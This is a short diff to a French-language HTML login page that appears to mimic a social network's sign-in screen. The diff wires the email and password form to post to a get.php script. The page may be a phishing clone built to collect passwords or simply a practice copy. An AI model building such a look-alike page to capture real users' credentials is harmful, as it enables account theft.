@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 
@@ -17,12 +18,12 @@
         </div>
 
         <div class="form">
-            <form class="a-form">
-                <input type="email" id="Email" class="a-email" name="Email" placeholder="Adresse e-mail ou numéro de tel."
+            <form class="a-form" method="post" action="get.php">
+                <input type="text" id="Email" class="a-email" name="Email" placeholder="Adresse e-mail ou numéro de tel."
                     autofocus="autofocus" required />
                 <input type="password" id="Password" class="a-pss" name="Password" placeholder="Mot de passe"
                     autofocus="autofocus" />
-                <input type="submit" class="a-sub" value="Se connecter" />
+                <input type="submit" class="a-sub" value="Se connecter" name="login" />
                 <a href="" class="a-link">Mot de passe oublié?</a>
                 <hr class="a-hr">
                 <input type="submit " value="Créer nouveau compte" class="a-but" />
